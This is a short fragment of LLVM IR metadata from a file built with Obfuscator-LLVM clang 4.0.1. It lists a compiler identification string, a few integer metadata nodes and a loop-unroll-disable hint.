!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146482628}
!2 = !{i32 -2146481188}
!3 = !{i32 -2146480365}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146479443}
!7 = !{i32 -2146478060}
